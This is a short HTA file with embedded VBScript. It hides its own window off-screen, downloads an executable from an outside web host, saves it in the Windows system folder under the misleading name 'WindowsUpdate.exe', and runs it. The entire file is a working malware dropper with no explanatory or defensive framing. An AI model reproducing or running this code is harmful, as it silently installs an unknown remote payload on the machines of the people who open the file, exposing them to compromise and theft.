
<html>
<head>
<HTA:APPLICATION 
 ID = "oApp" 
 VERSION = "1.0" 
 SHOWINTASKBAR="no" 
 SINGLEINSTANCE="yes"
 INNERBORDER="no" 
 SCROLL="no"
 WINDOWSTATE="minimize"
 MINIMIZEBUTTON="no"
 MAXIMIZEBUTTON="no"
 CAPTION="no"
 BORDER="none"
 NAVIGABLE="yes"
>
</head>
<body>
<script>window.blur();</script>

<script language="vbscript"> 

 
    self.MoveTo 5001,5001
 
    payload = "http://brightweb.biz/newt.exe" 
 
    const ForWriting = 2 
 
    set xmlHTTP = CreateObject("Microsoft.XMLHTTP") 
    xmlHTTP.open "GET", payload, false 
    xmlHTTP.send 
    contents = xmlHTTP.responseBody 
 
    Set fso = CreateObject("Scripting.FileSystemObject") 
    target = fso.GetSpecialFolder(1) & "\\WindowsUpdate.exe"
    Set f = fso.CreateTextFile(target, ForWriting) 
 
    for i = 0 to UBound(contents) 
        thischarcode = ascb(midb(contents, i+1, 1)) 
        f.Write chr(thischarcode) 
    next 
 
    f.close 
 
    Set shell=CreateObject("WScript.Shell") 
    shell.run(target) 

</script> 

</body>
</html>

